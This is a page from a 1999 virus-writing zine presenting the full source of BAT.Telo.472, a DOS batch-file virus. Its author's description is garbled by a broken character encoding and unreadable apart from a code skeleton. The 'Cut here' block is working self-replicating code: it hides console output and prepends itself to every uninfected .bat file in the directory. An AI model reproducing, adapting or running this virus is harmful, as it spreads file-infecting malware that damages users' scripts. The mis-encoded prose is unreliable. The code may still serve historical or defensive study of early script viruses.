Bat.Telo.472 by Duke


- [Duke's Virus Labs #5] - [Page 12] -

BAT.Telo.472
(c) by Duke/SMF

��� �����     : BAT.Telo.472
����         : Duke/SMF
��� �ண�.   : DOS-script
� �  ᮧ� ��� : 16.02.99

   �� �०���� �ᯮ��㥬 ��� ��� FIND, �� � � ���� �� � �� �����
��� �� �� �����  � �, �� ����  � ��� �  � ����, �� � ��� �� ��ࢮ�
(� ���� � �, ����⢥��� :) �奬 ��᪨ �� �룫廊� � � :
        goto telo
        :begin
        <⥫� ����� >
        goto end
        :telo
        <⥫� �����>
        goto begin
        :end
   �� �⮨� �४ �� ���� � �஬������� ���  - � �⥫ ��� � �� ��⮤,  
�� ������ ४���. �᫨ �㤥� �६�, � ��⨬������ ��� ����� .

===== Cut here =====
@goto telo
:begin tel
@ctty nul%tel%
if "%1=="$ goto ztel
find "tel"<%0>tel.bat
echo.>>tel.bat
echo>>tel.bat @goto begin
echo>>tel.bat :end
for %%b in (*.bat) do call tel.bat $ %%b
del tel.bat
ctty con%tel%
@goto end%tel%
:ztel
find "tel"<%2>nul
if not errorlevel 1 goto end%tel%
find "tel"<%0>tel
type %2>>tel
echo.>>tel
echo>>tel @goto begin
echo>>tel :end
ren tel %2
copy tel %2
del tel
goto end%tel%
:telo (c) by Duke/SMF
::This is host file...
::Enjoy !
@goto begin
:end
===== Cut here =====
